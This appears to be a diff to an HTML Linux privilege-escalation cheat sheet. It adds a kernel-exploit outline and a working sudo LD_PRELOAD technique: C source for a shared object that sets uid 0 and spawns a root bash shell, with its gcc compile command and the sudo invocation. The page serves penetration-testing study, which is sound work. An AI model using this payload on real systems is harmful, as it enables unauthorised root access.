@@ -8,7 +8,10 @@
         <div>
           <h3>List Exploit Methods</h3>
           <ul>
-            <li>Kernel Exploits </li>
+            <li><a href="#kernel-exploit">Kernel Exploits </a>
+            </li>
+            <li><a href="#sudo">Sudo</a>
+            </li>
           </ul>
             <h3>Use for Linux Commands for Privilege Escalation</h3>
             <table class="DefaultTable">
@@ -90,6 +93,40 @@
                                 minutes)</li><li><code>find / -size 50M</code>: find files with a 50 MB size</li></ul>
             
             
+            
+        </div>
+        <div id="kernel-exploit">
+            <h2>Kernel Exploit</h2>
+            <p>1. Identify the kernel version <i> cat /proc/version</i>   </p>
+            <p>2. Search for exploit for this spacific version</p>
+            <p>3. Run the exploit</p>
+            
+        </div>
+        <div id="sudo">
+            <h2>Sudo</h2>
+            <p>Check sudo permissions users <code> sudo -l </code></p><br>
+            <b>Leverage LD_PRELOAD</b><br>
+            <p>1. Check <i>"env_keep" </i> enable or not using sudo -l.<br>
+            2. Write a simple C code compiled as a share object (.so extension) file <br>
+            <pre>
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+            </pre>
+            </p>
+            <p>
+            Now save the file with shell.c extension and then compile with gcc in shell.so format.
+            </p>
+            <p>Complie Command: <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code> </p>
+            <p>3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file</p>
+            <code>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</code>
             
         </div>
     </body>
